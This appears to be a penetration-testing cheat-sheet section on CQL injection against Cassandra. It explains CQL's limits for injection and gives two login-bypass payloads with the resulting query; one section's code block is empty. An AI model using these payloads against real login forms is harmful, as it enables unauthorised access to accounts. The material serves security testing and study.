## CQL Injection Limitations

* Cassandra is a non-relational database, so CQL doesn't support `JOIN` or `UNION` statements, which makes cross-table queries more challenging.

* Additionally, Cassandra lacks convenient built-in functions like `DATABASE()` or `USER()` for retrieving database metadata.

* Another limitation is the absence of the `OR` operator in CQL, which prevents creating always-true conditions; for instance, a query like `SELECT * FROM table WHERE col1='a' OR col2='b';` will be rejected.

* Time-based SQL injections, which typically rely on functions like `SLEEP()` to introduce a delay, are also difficult to execute in CQL since it doesnâ€™t include a `SLEEP()` function.

* CQL does not allow subqueries or other nested statements, so a query like `SELECT * FROM table WHERE column=(SELECT column FROM table LIMIT 1);` would be rejected.

## Cassandra Comment

```sql

```

## Cassandra Login Bypass

### Example #1

```sql
username: admin' ALLOW FILTERING; %00
password: ANY
```

### Example #2

```sql
username: admin'/*
password: */and pass>'
```

The injection would look like the following SQL query

```sql
SELECT * FROM users WHERE user = 'admin'/*' AND pass = '*/and pass>'' ALLOW FILTERING;
```
